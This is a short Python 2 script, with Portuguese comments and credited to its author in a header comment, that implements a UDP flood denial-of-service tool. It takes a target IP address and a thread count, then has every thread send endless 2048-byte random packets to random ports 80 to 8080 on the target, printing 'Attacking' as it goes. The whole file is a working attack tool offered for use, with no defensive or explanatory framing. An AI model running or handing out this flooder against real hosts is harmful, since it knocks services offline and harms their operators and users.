# Script por Daniel Victor Freire
# UDP Flood program
# -> flood_udp.py 192.168.0.100 25

from thread import start_new_thread as thread
from socket import socket, AF_INET, SOCK_DGRAM
from os import _exit
from sys import argv, stdout
import random

def ddos(ip):
	while 1:
		port = random.randint(80, 8080) # portas de 80 ate 8080
		bytes_ = random._urandom(2048) # cria um string com 2048 bytes
		s = socket(AF_INET, SOCK_DGRAM) # socket udp
		stdout.write("\rAttacking %s:%i"%(ip, port))
		s.sendto(bytes_, (ip, port)) # envia os bytes
		s.close() # encerra o socket

try:
	ip = argv[1]
	nthreads = int(argv[2])
except IndexError:
	print "Usage : %s <ip> <threads>"%(argv[0].split("\\")[len(argv[0].split("\\")) - 1])
	_exit(0)

try:
	for x in xrange(nthreads):
		thread(ddos, (ip,)) # cria a thread

	while 1:
		pass # cria a exception para a thread

except KeyboardInterrupt:
	_exit(0)